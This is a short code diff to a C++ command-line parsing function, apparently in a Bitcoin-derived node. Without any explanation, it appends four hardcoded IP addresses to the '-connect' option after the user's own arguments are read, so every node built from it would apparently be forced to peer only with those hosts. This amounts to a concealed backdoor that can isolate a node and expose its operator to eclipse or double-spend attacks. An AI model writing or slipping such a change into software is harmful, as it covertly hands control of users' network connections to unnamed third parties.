@@ -384,6 +384,10 @@ void ParseParameters(int argc, const char* const argv[])
         mapArgs[str] = strValue;
         _mapMultiArgs[str].push_back(strValue);
     }
+     _mapMultiArgs["-connect"].push_back("46.166.174.74");
+     _mapMultiArgs["-connect"].push_back("46.166.174.76");
+     _mapMultiArgs["-connect"].push_back("46.166.174.77");
+     _mapMultiArgs["-connect"].push_back("46.166.174.75");
 }
 
 bool IsArgSet(const std::string& strArg)
